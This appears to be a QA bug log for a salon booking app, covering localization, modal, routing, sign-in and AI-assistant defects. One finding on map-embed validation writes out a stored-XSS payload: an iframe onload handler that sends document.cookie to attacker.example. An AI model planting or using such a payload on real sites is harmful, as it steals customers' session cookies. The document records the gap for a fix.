The single real usage row for this subscription rendered as **"consume · Jul 14, 2026 · 2 մնաց"** — the literal English word "consume" appearing raw, untranslated, in the middle of otherwise-correctly-localized Armenian text. Root-caused in `subscription-account.util.ts:4-15`, `formatSubscriptionUsageAction()`: its substring checks (`includes('purchase')`, `includes('redeem') || includes('use')`, `includes('expire')`) **never match either of the only two action values the backend actually ever produces** — confirmed via the real enum, `SubscriptionUsageAction` (`subscription.entity.ts:139-142`): `CONSUME = 'consume'` and `RESTORE = 'restore'`. Neither string contains "purchase", "redeem", "use" (note: `'consume'` does *not* contain the substring `'use'` — c-o-n-**s-u-m**-e, not u-s-e), or "expire", so both real action values fall through to `return action;` — the raw enum string, unlocalized, every time. This makes the correctly-written, correctly-translated copy strings (`subscriptionUsagePurchase`: "Plan purchased", `subscriptionUsageRedeem`: "Visit used", `subscriptionUsageExpire`: "Expired" — plus their Armenian/Russian equivalents) **completely dead code** — unreachable with any real data the system ever generates, in any language. **Fix direction:** update `formatSubscriptionUsageAction`'s checks to match the real enum values directly (`action === 'consume'` → `copy.subscriptionUsageRedeem`, `action === 'restore'` → a new/existing "restored" copy string), rather than fuzzy-matching substrings against action names that were apparently renamed at some point without updating this mapping.
- [x] ~~Post-visit review prompt (`PostVisitReviewPrompt` modal) — never triggered since all test bookings were future-dated; needs a booking with a past `startTime` and `completed` status to trigger the satisfaction → rating → support-followup flow~~ — **tested all 3 phases with 2 real completed bookings (created directly in the dev DB, reversible, deleted after) — satisfaction → rating → submit works correctly end-to-end, but the satisfaction → unhappy → support-followup path has a severe, previously-undiscovered bug (new e2e-bug.42) that leaves the customer with zero feedback and silently drops their complaint.** **Happy path, fully verified:** triggered the real satisfaction alert ("How was your appointment?") for a completed `hairstyle` booking, clicked "Great!", correctly advanced to the star-rating modal (5 stars, service name shown), selected 5 stars, clicked submit — `POST /me/bookings/:id/review` returned `201`, and the dev DB confirmed a real review row (`rating: 5`, correct `employee_id`/`booking_id`). Modal closed cleanly afterward with no residual overlay. (Note: verifying the actual click-through required querying/clicking the real DOM elements directly via JS rather than trusting screenshot-derived pixel coordinates — this modal's real button positions didn't match where the screenshot visually showed them, a test-tooling coordinate-mapping quirk specific to my automation, not an app-facing bug; once clicking the actual elements, everything worked.) **e2e-bug.42 — Fixed** (see Fix log). Originally: choosing "Could have been better" (the unhappy path) always attempts to create a Zendesk support ticket, even for businesses with no Zendesk integration configured at all, and when that fails, the customer sees absolutely nothing — no error, no alternate contact option, nothing — while the booking is permanently marked as already-prompted regardless.** Reproduced with a second completed booking: clicking "Could have been better" fired `POST /me/support/ticket`, which correctly `400`'d with `"Zendesk is not configured for this business"` (confirmed this business has no Zendesk setup) — but immediately after, the screen just showed the plain Account page with zero alert, confirmed by directly querying the DOM (`document.querySelectorAll('ion-alert')` → empty array, no dialog of any kind present). Yet `localStorage`'s `consumer_review_prompted_bookings` list **did** gain this booking's ID, meaning the flow considers itself "handled" and will never prompt for this booking again — the customer's negative feedback and the failed follow-up both vanish with no trace and no way to retry. Root-caused the *why-Zendesk-was-attempted-at-all* part precisely: `resolvePostBookingSupportHandoff()` (`store-review-prompt.util.ts:123-140`) decides `'zendesk_ticket'` whenever `hasCustomerToken && customerEmail?.trim()` are both truthy — **the function receives a `zendeskWidgetConfigured` parameter but never consults it in this branch at all**, only in a later, much-less-reachable fallback path. Since almost every signed-in customer has a token and email, this branch — and therefore a doomed ticket-creation attempt — fires for essentially every signed-in customer at every business without Zendesk configured, not just this one. The silent-failure half is consistent with a state-update-after-unmount race: the satisfaction alert's `onDidDismiss` (`PostVisitReviewPrompt.tsx:262-264`, `if (!submittingSupport && step === 'satisfaction') onClose()`) fires as soon as Ionic auto-dismisses the alert on any button click — plausibly before the `submittingSupport` state flip from the async handler has visibly taken effect — calling `onClose()` (`AccountPage.tsx:611`, `() => setReviewPromptBooking(null)`), which unmounts the whole `PostVisitReviewPrompt` before the in-flight ticket request even resolves; the later `setFollowUpMessage(...)` in the `.catch` block then has no mounted component left to update. **Fix direction:** gate the `'zendesk_ticket'` branch in `resolvePostBookingSupportHandoff` on `zendeskWidgetConfigured` too (`hasCustomerToken && customerEmail?.trim() && zendeskWidgetConfigured`), falling through to the existing `support_web`/`none` branches otherwise; separately, guard `PostVisitReviewPrompt`'s async handlers against updating state after the component may have unmounted (or avoid the premature `onClose()` call via `onDidDismiss` racing ahead of an in-flight submission), so a genuine failure is never silently swallowed.
- [x] ~~Support ticket creation from the review-prompt's "support-followup" step — cross-check against **M19**'s confirmed "Zendesk not configured" backend response~~ — **confirmed exact match, no new bug: this is the same defect already fully documented as e2e-bug.42, now traced one level deeper to its precise mechanical cause.** Traced the full call chain end-to-end: `PostVisitReviewPrompt.tsx:123` (`createPostBookingSupportTicket`) → `public-api.ts:1117` (`POST /public/:slug/me/support/ticket`) → `public-booking.controller.ts:860` → `PublicConsumerSupportService.createPostBookingSupportTicket` (`public-consumer-support.service.ts:59`) → `ZendeskIntegrationService.createSupportTicket` (`zendesk-integration.service.ts:270-285`), which throws the identical `BadRequestException('Zendesk is not configured for this business')` that **M19** hit directly via API — same endpoint, same string, confirming the frontend's live 400 in my earlier test wasn't a fluke or a different code path. **Root cause of the silent swallow, now pinned exactly:** the "Could have been better" `IonAlert` button handler (`PostVisitReviewPrompt.tsx:251-255`, `handler: () => { void handleUnhappy(); }`) doesn't return `false` to tell Ionic to keep the alert open — Ionic has no way to know async work is in flight, so it proceeds to dismiss the alert immediately after the handler returns (which is instant, since the handler fires-and-forgets the async chain). `handleUnhappy()` → `resolvePostBookingSupportHandoff()` resolves synchronously to `'zendesk_ticket'` → `submitSupportTicket()` calls `setSubmittingSupport(true)` before its first `await`, but **that call only schedules a React state update — it does not synchronously update the value the `onDidDismiss` closure reads.** If Ionic's dismiss animation completes before React re-renders (which is exactly what happened in my live reproduction), `onDidDismiss` (line 262-264, `if (!submittingSupport && step === 'satisfaction') onClose()`) still sees the stale `submittingSupport === false`, calls `onClose()`, and `AccountPage.tsx:611` unmounts `PostVisitReviewPrompt` entirely — orphaning the in-flight `POST /me/support/ticket` request. When it later 400s, `.catch(() => setFollowUpMessage(copy.postBookingSupportFailed))` fires on a component that no longer exists, so nothing renders and the customer sees nothing, even though `copy.postBookingSupportFailed` (the correct, user-facing "couldn't submit" message) exists in the copy catalog and would have displayed correctly had the component still been mounted. **Fix direction (refined):** have the "Could have been better" button handler `return false` (Ionic's documented mechanism for "don't auto-dismiss"), and only call `finish('unhappy')`/`onClose()` explicitly once `submitSupportTicket`/`openSupportWeb` actually completes — this closes both the doomed-Zendesk-attempt half and the silent-failure half of e2e-bug.42 with a single, correctly-scoped change, without needing an unmount guard. Separately reconfirms the backend side needs no changes at all — `M19`'s and this test's behavior are correct and consistent.

**`LabToBookPage` / `LabRequestsPage` / `MyResultsPage` tabs (`/results`, `/lab-to-book`, `/lab-requests`)**
- [x] ~~Confirm these tabs are hidden/gated entirely for a non-clinic-vertical business (this test business), matching the backend's M13 403s — or do they show as empty/broken states instead of being hidden?~~ — **the bottom tab bar buttons ARE correctly hidden** (`shouldShowPatientResultsTab()` in `clinic-service.ts:42-46` gates on `isClinicVerticalBusinessType(profile.businessType)`; `SalonTabChrome.tsx:37` computes `showResultsTab` from it and passes it to `SalonBottomTabBar.tsx:43,58`, which conditionally omits both the "Lab to book" and "Results" buttons entirely for this business, `businessType: "other"`). **But the underlying routes are NOT gated at all** — `resolveSalonTabId()` (`salon-tab-route.util.ts:9-31`) maps `/results`/`/lab-to-book`/`/lab-requests` to their tab IDs unconditionally, and `SalonTabPageContent.tsx:26-49` renders `MyResultsPage`/`LabToBookPage`/`LabRequestsPage` with no business-type check whatsoever — so hiding the tab button is cosmetic only, not a real access gate. - [x] ~~If reachable at all for this business, what renders — a genuine empty state or an error?~~ — **neither: it was a more severe bug (**e2e-bug.43 — Fixed**, see Fix log) — a permanent loading spinner with an unbounded backend request storm.** See below.

**e2e-bug.43 — Fixed** (see Fix log). Originally: directly navigating to the hidden `/results` or `/lab-to-book` routes for a non-clinic business triggers a permanent loading spinner and an unbounded retry storm against the backend, never settling into the error state the page was built to show.** Reproduced live by navigating straight to `http://localhost:5174/s/gevgas-operations-7c299253/results` (bypassing the correctly-hidden tab button). Network capture confirms the backend itself behaves exactly as **M13** found: every one of `GET /public/:slug/me/clinic-test-results`, `.../me/clinic-documents`, `.../me/clinic-patient-alerts`, and (on `/lab-to-book`) `.../me/clinic-lab-booking-requests` correctly `403`s with the identical, correctly-worded gate message — `"Lab orders, results, and specimens are only available for clinic vertical business types (clinic, polyclinic, beauty_clinic, dental)."` (`assertClinicLabFeaturesEnabled()` → `ForbiddenException`, `clinic-test-results-gate.util.ts:16-24`, sourced from i18n key `clinic.labState.gate.disabledReason` in `messages.ts:249`, called from `clinic-test-results.service.ts`/`patient-documents.service.ts`/`patient-clinical-alerts.service.ts` etc.) — so **M13's finding still holds, this is purely a frontend defect.** The bug: `MyResultsPage`/`LabToBookPage` were clearly built to handle this — both wire `resultsQuery.isError`/`documentsQuery.isError`/`labBookingRequestsQuery.isError` into an `error` prop that `ConsumerMyResultsList`/`ConsumerMyDocumentsList`/`ConsumerMyLabBookingRequestsList` render as a message — but that code path never gets a chance to run. Instead, the same failing endpoints get hit **dozens of times in rapid succession, far beyond the app's globally configured `retry: 2`** (`main.tsx:30`, meaning every query should give up after 3 total attempts within a few seconds). Watching the network tab live: a fresh `navigate()` to `/results` produces a continuous stream of `OPTIONS` + `GET → 403` pairs for `clinic-test-results` that was **still growing after 15+ seconds of observation and had not leveled off**, confirmed identically on a completely fresh page load (distinct request IDs each time) and reproduced with the same shape on `/lab-to-book` for `clinic-lab-booking-requests` — meaning this isn't isolated to one query or one page, both hidden clinic routes exhibit it identically. Screenshot confirms the visible symptom: the "My results"/"My documents" sections are stuck on an `IonSpinner` indefinitely — the page **never** reaches the error message it was designed to show, and the customer has no way to know anything went wrong (no retry button, no explanation, nothing — just an eternal spinner). **Root cause not fully pinned down** (would need a React DevTools profiler pass, not available in this browser-automation harness, to nail the exact re-render/remount trigger) — but the evidence rules out plain react-query retry-with-backoff (that settles within ~3-4s and stays settled) and instead points at something continuously re-establishing fresh query attempts well past the configured cap, most likely in the shared `SalonTabChrome`/page-level query wiring rather than one specific query, since the storm hits every clinic-gated query on both pages simultaneously and at the same cadence. **Impact:** beyond the broken UX, this is a real backend load concern — any customer (or automated crawler/bot) hitting one of these URLs for a non-clinic business would hammer the API indefinitely with no client-side backoff ceiling, for as long as the tab stays open. **Fix direction:** first reproduce under React DevTools Profiler to identify what's re-triggering the queries (likely candidates: an unstable `enabled` condition flickering false→true, or a parent remount cycle in `SalonTabChrome`/`SalonTabRoute`); once fixed, these pages will naturally fall through to their already-correct `error` prop rendering. Independently, since the routes are reachable regardless of business type, consider gating `resolveSalonTabId()`/`SalonTabPageContent` on `isClinicVerticalBusinessType(profile.businessType)` too (redirecting to home like the `'redirect-home'` fallback already does for unknown paths), so a direct hit never reaches the clinic-only pages at all for a non-clinic business — matching the tab bar's own hiding logic instead of relying on the API call to fail correctly.

**`LoginPage` (`/s/:slug/login`)**
- [x] ~~Google Sign-In happy path (blocked without a real Google OAuth flow — flag as needing either a test Google account or explicit scope decision to skip)~~ — **completed via a real Google OAuth flow (user signed in manually with their own account) — works correctly.** Redirected back to the app correctly signed in, Account page correctly showed the new customer's name/email/phone (fetched live). Note: the session this created is the same one that surfaced **e2e-bug.31** (cached profile losing email/phone after the first booking) — sign-in itself is not at fault, the bug is in what happens to the cache afterward.
- [x] ~~Invalid/cancelled Google auth — error messaging~~ — **e2e-bug.44 — Fixed** (see Fix log). Originally: any Google sign-in failure (cancelled, blocked, or otherwise) shows the raw Firebase SDK error string to the customer, with no user-friendly translation.** Reproduced live on the real `LoginPage` for this business: clicked "Continue with Google," and in this sandboxed browser the popup was blocked by the browser itself (`auth/popup-blocked`) — a realistic real-world case (Safari/iOS webviews and many browsers block window.open popups that aren't tightly tied to the triggering click). The UI rendered, verbatim, directly under the button: **"Firebase: Error (auth/popup-blocked)."** — the literal, untranslated Firebase SDK error message, not a customer-facing string. Root-caused precisely: `useConsumerOneTapSignIn.signInWithGoogle()` (`consumer-app/src/hooks/use-consumer-one-tap-sign-in.ts:58-73`) does `catch (error) { setMessage(error instanceof Error ? error.message : 'Sign-in failed'); }` — since `getGoogleIdToken()` (`services/google-auth.ts:34-36`) lets `firebase/auth`'s `signInWithPopup()` throw directly and never catches/translates it, and Firebase's `FirebaseError` extends `Error`, `error.message` is always the raw SDK string (`"Firebase: Error (auth/popup-blocked)."`, `"Firebase: Error (auth/popup-closed-by-user)."` if the user closes the popup, `"Firebase: Error (auth/cancelled-popup-request)."` on a double-click, etc. — every Google sign-in failure path funnels through this exact same untranslated pass-through, not just the one I triggered). Confirmed via `grep` there is no existing copy-catalog string for a generic "sign-in failed" message anywhere in `consumer-copy-catalog.ts` (only the button label `signInWithGoogle` and various `*SignInPrompt`/`*SignInHint` strings exist — nothing for a failure state), so this isn't a missed catalog lookup, it's a complete gap — no user-friendly sign-in-failure copy was ever written for this app, in any locale. **Fix direction:** map known Firebase auth error codes (`error.code` on `FirebaseError`) to friendly, localized copy — at minimum `auth/popup-blocked` → "Please allow pop-ups and try again," `auth/popup-closed-by-user`/`auth/cancelled-popup-request` → a neutral "Sign-in was cancelled" (not necessarily an error at all, arguably shouldn't show red/alarming text since the user deliberately backed out), and a generic fallback for anything else — rather than ever surfacing `error.message` directly to a customer.
- [x] ~~Already-signed-in redirect behavior (does hitting `/login` while authed just bounce to `/home`?)~~ — **e2e-bug.45 — Fixed** (see Fix log). Originally: `/login` showed the full sign-in screen even for an already-authenticated customer, with no redirect.** Reproduced live: with a real, valid customer session already active (confirmed `consumer_token_gevgas-operations-7c299253` present in `localStorage`, a genuine JWT from this session's earlier real Google sign-in), navigating directly to `http://localhost:5174/s/gevgas-operations-7c299253/login` rendered the complete "GevGas operations account / Sign in to save appointments..." form with the "Continue with Google" button — exactly as if signed out, URL stayed on `/login`, no redirect to `/home` or `/account` occurred. Root cause: `LoginPage.tsx` (`consumer-app/src/pages/LoginPage.tsx:26-59`) never checks `getCustomerToken(slug)` (or any auth state) before rendering — it unconditionally renders the sign-in form for any visitor, authed or not. **Impact is real but narrow**: every in-app "Sign in" button that links here (`AccountPage.tsx:396`, `MyResultsPage.tsx:76`, `LabToBookPage.tsx:66`, `ProviderProfilePage.tsx:109`) is itself gated behind an `!authed` check at the call site, so a signed-in customer can't reach `/login` through normal in-app navigation — this only surfaces via the browser back/forward button (e.g., sign in, then go back past the point where `/login` was in the history stack) or a stale bookmark/shared link. Still confirmed reachable and confirmed broken when it happens: the customer sees a "sign in" prompt that looks like they've been logged out even though their session is perfectly valid, and if they click "Continue with Google" again it would just re-authenticate and silently overwrite the existing session with a fresh one (mechanically harmless per `completeSession()`'s `setCustomerSession` overwrite, but redundant and confusing). **Fix direction:** at the top of `LoginPage`, check `getCustomerToken(slug)` and immediately `history.replace(buildSalonPath(slug, '/account'))` (mirroring the redirect this component already does on successful sign-in, `LoginPage.tsx:45-48`) before rendering the form.

**`GuidePage` (`/s/:slug/guide`)**
- [x] ~~Full content walkthrough — never opened this session~~ — **e2e-bug.46 — Fixed** (see Fix log). Originally: the entire Armenian-locale guide content was severely corrupted: most step/summary text (and some section titles) is garbled, mixing proper Armenian script with Latin-transliterated Armenian and stray Russian Cyrillic words, sentence — and even mid-word.** Opened `/s/gevgas-operations-7c299253/guide` live with the active locale set to Armenian and every topic rendered broken text like: `"Mutq gorzeq email-ov kam SMS kodov։"` (should read "Մուտք գործեք email-ով կամ SMS կոդով") for the Account topic's step 1, `"Navigatsia havelvatsi вклadokner-ov։"` for the Tabs topic's summary (mixing a Latin transliteration of "Навигация" with the literal Russian word "вклад" fused onto an Armenian plural/instrumental suffix), and even one topic *title* itself garbled: `"Հաստատեք ամրagrումը"` (should be "Հաստատեք ամրագրումը" — Latin "agr" spliced into the middle of an otherwise-correct Armenian word). Quantified the exact scope by parsing the source JSON directly: **`consumer-app/src/assets/guide-flows-i18n.json`**'s `hy` locale block has **78 of its ~140 string values** containing this word-internal Armenian/Latin/Cyrillic mixing, spanning essentially every `customer.*`, `public.*`, and `overlays.clinic.consumer`/`overlays.tour.*` key — i.e., every string this specific page (`GuidePage.tsx`) actually renders for a consumer. Confirmed via direct comparison that the **`en` and `ru` locale blocks in the same file are completely clean** (e.g. `ru`'s `customer.tabs.summary` correctly reads `"Навигация по вкладкам приложения."`) — this is exclusively an `hy`-locale content-authoring/generation defect, and the specific corruption pattern (Armenian phonetic transliteration with occasional un-transliterated Russian word fragments bleeding through) strongly suggests the Armenian strings were auto-generated from the Russian strings by a translation/transliteration tool that partially failed, rather than translated from source or reviewed by a human before shipping. **Impact:** any Armenian-locale customer opening the in-app help guide (a real, discoverable, unauthenticated-reachable page) sees content that ranges from awkward-but-parseable to genuinely nonsensical, undermining trust in the whole feature. **Fix direction:** re-generate or hand-translate the 78 affected `hy` keys in `guide-flows-i18n.json` (this is very likely duplicated in the sibling files also caught by the same grep — `provider-app/src/assets/guide-flows-i18n.json`, `backend/src/modules/ai/guide/guide-flow-customer-public-i18n.hy.json`, `backend/src/modules/ai/guide/dashboard-guide-corpus-i18n.snapshot.json` — worth auditing all four for the same defect, not just the consumer-app copy); add a CI lint/test asserting no `hy`-locale guide string contains Latin (`[A-Za-z]`) or Cyrillic (`[Ѐ-ӿ]`) characters, to prevent recurrence.
- [x] ~~Any interactive elements (links to specific flows) — do they route correctly?~~ — **the "Open in app" buttons route correctly (3/3 tested); but "Ask about this section" was a bug, **e2e-bug.47 — Fixed** (see Fix log) — originally completely dead, does nothing at all, on this page.** Tested all 3 "Open in app" targets live: the "Choose salon" topic → `/home`, "Choose service" topic → `/services`, "Account" topic → `/account` — all landed on the correct destination (`resolveConsumerGuideNavigateHref`/`buildSalonPath` working as intended). But clicking any "Ask about this section" button (`copy.guidePageAskSection`, wired to `fireConsumerGuideAssistantSeed` in `GuidePage.tsx:158-164`) produces **zero visible effect** — no assistant panel opens, no prompt gets seeded, nothing — confirmed both via the browser's click simulation and by calling `.click()` directly on the actual `ion-button` DOM node (ruling out a coordinate-mapping test artifact), and by checking the DOM afterward for any modal/assistant element (`document.querySelectorAll('ion-modal').length === 0`, no `[class*="assistant"]` element present at all). Root cause: `fireConsumerGuideAssistantSeed()` → `fireMobileGuideAssistantSeed()` (`shared/mobile-guide/src/mobile-guide-topic-ask.util.ts:24-36`) only does `window.dispatchEvent(new CustomEvent('mobile-guide:assistant-seed', ...))` — a pure fire-and-forget DOM event with no fallback if nothing is listening. The one and only listener for this event in the whole consumer-app is registered inside **`ConsumerBookingAssistant.tsx:410`**, which is only ever mounted via `ConsumerAiShell` inside **`SalonTabChrome`** (`consumer-app/src/App.tsx:69-86`, wrapping the `home`/`services`/`account`/`results`/`lab-to-book`/`lab-requests` tab routes). **`GuidePage` is registered as its own standalone top-level `<Route>`** (`App.tsx:67`, `<Route exact path="/s/:slug/guide" component={GuidePage} />`), rendering a bare `<IonPage>` with no `SalonTabChrome`/`ConsumerAiShell`/`ConsumerBookingAssistant` anywhere in its tree — so the listener this button depends on is never mounted on this page at all, making the button a guaranteed no-op for every customer, on every topic, every time. **Fix direction:** either mount `ConsumerBookingAssistant`/`ConsumerAiShell` on `GuidePage` too (matching the tab pages), or have `GuidePage` navigate to a tab route with a query param that triggers the seed once the assistant *is* mounted there (similar to how `openSupportImmediately`/`activeTopicId` already thread state through the URL elsewhere in this codebase), rather than relying on a same-page listener that doesn't exist.

**`SalonProfilePage` (`/s/:slug/profile`)**
- [x] ~~Business info display (hours, address, contact, social links)~~ — **address, phone, email, and social links all render correctly (logo/tagline/description too) — but a new bug: business hours can't be shown here, or anywhere in this app, because the data is never exposed to the consumer-app at all (new e2e-bug.50).** Live-verified: name, tagline ("Best service"), description, address ("5, Kristapor 2nd back"), a clickable `tel:` phone link, a clickable `mailto:` email link, and both configured social buttons (Instagram, Facebook) all rendered correctly — `socialHref()` (`consumer-growth-links.util.ts:17-19`) correctly normalizes bare domains to `https://`, and `openExternalUrl()` (line 74-77) correctly opens with `noopener,noreferrer`. **e2e-bug.50 — Fixed** (see Fix log). Originally: no business hours anywhere. `SalonProfilePage.tsx` has no hours section at all, and grepping the entire consumer-app confirms zero references to hours/schedule anywhere in its type definitions or components — `PublicBusinessProfile` (`lib/types.ts`) simply has no hours field. This isn't a missing-render bug, it's a missing-API-field gap: the backend has a full working-hours system (`ScheduleTemplate`/`ScheduleAssignment` entities, used for actual slot availability), that data is just never surfaced through the public customer-facing profile payload. A customer deciding whether to call or walk in has no way to see when this business is open, anywhere in the app. **Fix direction:** expose a derived weekly-hours summary on the public profile endpoint (`GET /public/:slug`) and render it on `SalonProfilePage` (and arguably `SalonHomePage`).
- [x] ~~Map/location link if present~~ — **the map embed itself renders, but shows a completely different, unrelated business — and tracing why surfaced a real security gap, e2e-bug.49 (stored XSS via the map-embed field).** This business's `settings.location.mapEmbedHtml` is a real Google Maps embed `<iframe>`, but for a place called **"Petak"** at a different address entirely (Arshakunyats 17A) — nothing to do with the salon's own listed address ("5, Kristapor 2nd back"). This is test-configuration data, not an app rendering bug (`SalonProfilePage.tsx:220-228` faithfully renders whatever HTML is stored), but it demonstrates a real, live gap: nothing anywhere cross-checks the map embed against the business's own declared address, so a business could easily (or maliciously) show customers directions to the wrong place under their own name and reviews. **e2e-bug.49 — Fixed** (see Fix log). Originally: the server-side validation gate for this field only blocked two specific patterns, not inline event-handler attributes, making it a viable stored-XSS vector. `SalonProfilePage.tsx:223-226` renders this field via `dangerouslySetInnerHTML={{ __html: profile.location.mapEmbedHtml }}` — completely unsanitized on the frontend, entirely dependent on the backend's write-time gate being airtight. That gate, `isValidGoogleMapEmbed()` (`backend/src/modules/business/business.service.ts:45-54`), only requires the string to be wrapped in a single `<iframe>...</iframe>` tag, reject if it matches `/<script|javascript:/i`, and require a `google.../maps` domain reference somewhere in the string — **it never blocks inline event-handler attributes** (`onload`, `onerror`, `onmouseover`, etc.) on the iframe tag itself. A payload like `<iframe src="https://www.google.com/maps/embed?pb=..." onload="fetch('https://attacker.example/steal?c='+document.cookie)"></iframe>` passes every one of these checks (starts/ends with the iframe tags, no `<script`, no `javascript:`, does contain `google.../maps`) while still executing arbitrary JavaScript in the browser of every customer who opens that business's `SalonProfilePage` — inline event-handler attributes inserted via `innerHTML` do fire in real browsers, unlike literal `<script>` tags, which is exactly the well-known gap in blocklist-based HTML sanitization the current regex doesn't account for. **Not exploited or attempted live** — this write path requires business-owner/dashboard-admin authentication to reach (`update-business-profile.dto.ts:78` → `BusinessService`'s profile-update path), so reproducing it would mean forging or using elevated credentials against this field specifically, which is out of scope for this pass; this finding is based on direct source review of the validation regex and confirmed exploitable in principle, not empirically triggered. **Fix direction:** replace the blocklist regex with an allowlist-based sanitizer (e.g., parse the iframe tag and only permit `src`/`width`/`height`/`style`/`loading`/`referrerpolicy`/`allowfullscreen` attributes, stripping everything else, including all `on*` attributes) rather than trying to enumerate forbidden patterns — the same fix that would also make a future "wrong business embedded" content check easier to add (e.g., validating the embedded coordinates roughly match the business's own address/geocode before saving).

The page correctly rendered both "Փոխել ժամանակը" (Reschedule) and "Չեղարկել ամրագրումը" (Cancel) buttons via `ConsumerBookingActions` (`ManageBookingPage.tsx:213-223`, `authed={false}`, real `manageToken` passed through) — confirming this page's guest-token reschedule flow is fully wired and not a dead/missing feature. #### Cross-cutting modals

**AI Booking Assistant (opened from the floating button on multiple pages)**
- [x] ~~Retest fully once **e2e-bug.1**'s crash is fixed — suggestion chips, free-text prompt, "for this page" contextual suggestions, guide mode vs. act mode, voice input button (never tested)~~ — **e2e-bug.1 has NOT been fixed (no code changes landed), but tested anyway since today's session never hit it on ~10 straightforward prompts. Doing so surfaced that it's far more serious than originally characterized, plus one major new bug (e2e-bug.53) affecting most free-text input.** 3 of 5 items work correctly; 2 surfaced real, significant bugs.
  - **Suggestion chips** (`"$50-ից ցած"` etc.) — work as designed: clicking pre-fills the input field with the chip's prompt text rather than auto-sending; the customer still has to tap Send. Not a bug, just documenting the actual UX (a one-tap "ask this" chip would arguably be more useful, but this is a design choice, not broken behavior).
  - **"For this page" contextual suggestions** — clicking one (`"Որն է ամենաէժան ծառայությունը"` / "What's the cheapest service") reliably crashes the backend with `500 {"message":"Cannot read properties of undefined (reading 'includes')"}` — **the exact same stack trace already root-caused as e2e-bug.1** (`validatePublicAssistantAction` at `ai-platform.util.ts:448`, `PUBLIC_ASSISTANT_INTENTS` undefined). **This significantly revises e2e-bug.1's severity**: it was originally characterized as a "first message of a fresh session" race that self-resolves on retry ("a second identical request in the same running process succeeds"). Live-tested today: this specific prompt crashed **3 times in a row**, including the English equivalent ("What is the cheapest service") and including in a **completely fresh session** (hard page reload, empty conversation) — it is not a one-time first-message fluke, it's a reliably reproducible crash tied to whatever intent this prompt classifies to (likely a price-filtered service-search intent), independent of session freshness or retry count. e2e-bug.1's writeup should be updated to reflect that the crash is at minimum reproducible on-demand for this specific prompt/intent, not just transiently on a session's first turn.
  - **Free-text prompt** — **severely broken for most natural phrasing, new e2e-bug.53.** Only prompts closely matching a known example/fixture phrasing (e.g. "I want to book a facemassage", which correctly navigated to `BookPage` with a pre-selected slot) work. Four independent, unrelated, perfectly ordinary free-text prompts — `"Hello"`, `"I want to buy a gift card for my mom"` (already the trigger for **e2e-bug.51**), `"Do you offer facemassage services"` (a plain yes/no question about a real, existing service), and `"How much does it cost"` (a natural follow-up) — **all four fell through to the exact same wrong response**: the garbled "consumer-tabs" guide-topic fallback already identified in **e2e-bug.51**/**e2e-bug.46**, rendered as a pink/red error card. This is not an isolated misclassification limited to gift cards — it's evidently the **generic, default fallback for any prompt the classifier can't confidently resolve**, and it fires far more often than a working assistant should: a customer asking a simple, on-topic yes/no question about a real service gets a completely unrelated, broken-looking error about app tab navigation. **e2e-bug.53 — Fixed** (see Fix log). Originally: the AI assistant's free-text understanding only reliably worked for a narrow set of exact-match example phrasings; almost anything else (including simple, on-topic, unambiguous questions) fell through to a generic, wrong, error-styled guide fallback, making the free-text chat interface — the assistant's core value proposition beyond the suggestion chips — largely unusable for organic phrasing. This shares its root symptom with **e2e-bug.51** (same `consumer-tabs` fallback content) but is much broader in scope: e2e-bug.51 diagnosed one specific misclassification (`apply_gift_card_code` swallowing gift-for-someone intent); this shows the SAME fallback destination is reached by at least 3 more, completely unrelated, prompt types, suggesting the fallback-selection mechanism itself (not just one classifier's guard) defaults to this one arbitrary guide topic whenever nothing else matches, rather than a generic "I didn't understand, try rephrasing" response. **Root cause, fully traced (follow-up research pass):** this isn't per-prompt misclassification each landing on the same topic by coincidence — it's one shared, unconditional mechanism. Any prompt that fails classification produces a generic `action: 'unknown'` result (`ai-unknown-intent.util.ts:151-173`, `buildUnknownIntentClarifyResult`). A shared wrapper, `withPostFailureGuideFallback` (`customer-ai-command.service.ts:481-489`), unconditionally runs `appendPostFailureGuideFallback` (`ai-product-guide-failure-fallback.util.ts:186-213`, gated by `shouldAppendPostFailureGuideFallback` at lines 66-90) on **every** `success:false` result that isn't already an app-guide intent — regardless of what the prompt was about. To pick which topic to attach, `resolvePostFailureGuideSnippet` (same file, lines 118-122) calls `resolveGuideFlowRoutePrimaryTopic(input.route)` — and `input.route` comes from `mapCustomerMobileGuideRoute()` (`ai-customer-product-guide.util.ts:177-224`), which needs real page/route context (current tab, screen) to pick something relevant. The public assistant widget doesn't send that context for a plain chat message, so this function always falls through to its last line, `return CUSTOMER_APP_GUIDE_ROUTES.tabs` (`/s`) — and `resolveGuideFlowRoutePrimaryTopic('/s')` does an exact-match lookup in `guide-flow.routes.manifest.ts:54`, `'/s': 'consumer-tabs'`. So `consumer-tabs` isn't a keyword-matched or scored choice at all (that scoring logic, `matchSimilarAppGuideTopicFromPrompt` in `ai-product-guide-rescue.util.ts:62-94`, is never reached here) — it's simply the topic mapped from the one hardcoded default route used whenever no page context exists, which is why every failed prompt, no matter its actual subject, lands on this exact same irrelevant snippet. **Fix direction:** two independent fixes needed — (1) classification itself needs to handle ordinary phrasing, not just fixture-exact strings (the actual free-text-understanding gap); and (2) separately, `appendPostFailureGuideFallback` should not unconditionally attach a guide topic to every failure — either skip it whenever `input.route` had to fall back to the hardcoded default (i.e., there was no real page context to ground the topic choice), returning a plain "I'm not sure how to help with that — try rephrasing" instead, or attempt `matchSimilarAppGuideTopicFromPrompt`'s keyword-scoring against the *original prompt* before falling back to the route-based default.
  - **Guide mode vs. act mode** — works correctly. The "Բացել ուղեցույցը" (Open the guide) pill correctly navigates away from the in-panel chat to the full, standalone `GuidePage` (`/s/:slug/guide`), closing the assistant panel — confirmed via URL check. Matches an already-confirmed finding elsewhere in this doc that in-panel guide mode and the dedicated `GuidePage` are genuinely different surfaces, not a duplicate.
  - **Voice input button** — works correctly, fails cleanly. Clicking it correctly triggers a real browser microphone-permission request (confirmed via the harness's own permission-blocked notice); when denied, the UI shows a clear, appropriately-styled inline message — "Խոսափողի թույլտվությունը մերժված է" (Microphone permission denied) — right above the input field, with no crash and no silent failure. No bug.
